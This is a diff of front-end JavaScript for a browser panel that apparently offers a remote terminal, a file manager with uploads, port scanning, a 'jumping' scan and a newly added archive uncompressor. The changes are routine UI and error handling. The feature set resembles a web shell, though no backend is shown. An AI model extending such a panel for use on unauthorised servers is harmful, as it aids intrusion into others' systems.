@@ -1957,7 +2101,12 @@ document.addEventListener('DOMContentLoaded', function() {
                 }
                 throw new Error(errorText || `HTTP error ${response.status}`);
             }
-            const responseData = await response.json();
+            // Check if response is empty before trying to parse
+            const responseText = await response.text();
+            if (!responseText) {
+                 return { status: 'error', message: 'AJAX request returned an empty response from server.' };
+            }
+            const responseData = JSON.parse(responseText);
             if (responseData.cwd) currentTerminalCwd = responseData.cwd;
             if (responseData.path) currentFileManagerPath = responseData.path;
             return responseData;
@@ -2172,20 +2321,17 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
-    // --- File Manager Event Delegation (FIXED) ---
     fileListingBody.addEventListener('click', e => {
         const target = e.target.closest('a, button');
         if (!target) return;
 
         const isDownloadLink = target.tagName === 'A' && target.title === 'Download';
 
-        // For the download link, we want the default browser action (following the href).
-        // For all other actions (which are JS-driven), we prevent the default action.
         if (isDownloadLink) {
-            return; // Allow the browser to handle the download.
+            return; 
         }
         
-        e.preventDefault(); // Prevent default for all other links/buttons.
+        e.preventDefault();
 
         const ds = target.dataset;
         if (target.classList.contains('dir-link')) fetchFiles(ds.path);
@@ -2275,7 +2421,7 @@ document.addEventListener('DOMContentLoaded', function() {
     fileUploadBtn.addEventListener('click', () => fileUploadInput.click());
     closeUploadModalBtn.addEventListener('click', () => {
         uploadModal.classList.remove('visible');
-        fetchFiles(currentFileManagerPath); // Refresh file list
+        fetchFiles(currentFileManagerPath);
     });
 
     fileUploadInput.addEventListener('change', async function() {
@@ -2284,7 +2430,7 @@ document.addEventListener('DOMContentLoaded', function() {
         uploadModal.classList.add('visible');
 
         const fileList = Array.from(this.files);
-        this.value = ''; // Reset input
+        this.value = '';
 
         const uploadPromises = fileList.map(file => {
             const progressItem = createProgressBar(file);
@@ -2353,7 +2499,6 @@ document.addEventListener('DOMContentLoaded', function() {
 
                 xhr.upload.onprogress = (e) => {
                     if (e.lengthComputable) {
-                        const chunkProgress = (e.loaded / e.total) * 100;
                         const totalProgress = ((chunkIndex + (e.loaded / e.total)) / totalChunks) * 100;
                         progressBar.style.width = totalProgress.toFixed(2) + '%';
                         percentageEl.textContent = totalProgress.toFixed(1) + '%';
@@ -2426,7 +2571,7 @@ document.addEventListener('DOMContentLoaded', function() {
         sendNetworkRequest(e.target.id, 'port_scan', data);
     });
 
-    // --- NEW: Jumping Feature Logic ---
+    // --- Jumping Feature Logic ---
     startJumpingScanBtn.addEventListener('click', async () => {
         jumpingResultsDiv.innerHTML = 'Scanning... <i class="fas fa-spinner fa-spin"></i>';
         startJumpingScanBtn.disabled = true;
@@ -2437,6 +2582,47 @@ document.addEventListener('DOMContentLoaded', function() {
             jumpingResultsDiv.innerHTML = `<span class="jumping-error">${htmlEntities(result.message || 'An unknown error occurred.')}</span>`;
         }
         startJumpingScanBtn.disabled = false;
+    });
+
+    // --- Uncompressor Feature Logic ---
+    uncompressorSubTabs.forEach(tab => {
+        tab.addEventListener('click', () => {
+            uncompressorSubTabs.forEach(t => t.classList.remove('active'));
+            uncompressorSubContents.forEach(c => c.classList.remove('active'));
+            tab.classList.add('active');
+            document.getElementById(tab.dataset.subtab).classList.add('active');
+            if (tab.dataset.subtab === 'uncompressor-upload') {
+                uncompressorLocalPathInput.value = '';
+            } else {
+                uncompressorFileInput.value = '';
+            }
+        });
+    });
+
+    uncompressorForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        uncompressorResults.innerHTML = 'Processing... <i class="fas fa-spinner fa-spin"></i>';
+        const formData = new FormData(uncompressorForm);
+        formData.append('ajax_action', 'uncompress_file'); // Fix: Manually add ajax_action for upload requests
+
+        const result = await sendAjaxRequest('uncompress_file', formData, true);
+
+        if (result.status === 'html_error' || (typeof result.status === 'undefined' && result.content)) {
+            uncompressorResults.innerHTML = `<div class="error">A server-side error occurred. The server sent back an invalid response (non-JSON). Check server error logs.</div>`;
+            console.error("Uncompressor HTML Error:", result.content || 'Response was not valid JSON.');
+            return;
+        }
+
+        const message = result.message ? htmlEntities(result.message).replace(/\n/g, '<br>') : 'Operation finished with no message.';
+        const resultClass = result.status === 'success' ? 'success' : 'error';
+        uncompressorResults.innerHTML = `<div class="${resultClass}">${message}</div>`;
+
+        if (result.status === 'success' && document.getElementById('filemanager').classList.contains('active')) {
+            const dest = document.getElementById('uncompressor-destination').value.trim();
+            if (dest === '.' || dest === '') {
+                 fetchFiles(currentFileManagerPath);
+            }
+        }
     });
 
 
